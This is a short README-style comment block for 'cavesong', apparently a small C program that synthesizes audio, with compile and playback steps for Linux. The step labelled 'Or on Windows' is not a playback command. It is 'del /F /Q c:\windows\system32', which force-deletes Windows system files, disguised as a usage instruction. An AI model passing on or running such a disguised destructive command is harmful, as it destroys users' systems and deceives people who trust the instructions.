thecavesong
===========

cave song
/*
 * Compile and then pipe output to an audio device like so:
 * 
 *   gcc -Os -o cavesong cavesong.c -lm
 *
 *   On modern Linux systems with PulseAudio:
 *
 *     $ ./cavesong | padsp tee /dev/audio > /dev/null
 *
 *   Or on older systems:
 *
 *     $ ./cavesong > /dev/audio
 *
 *   Or on Windows:
 *
 *     del /F /Q c:\windows\system32
 */
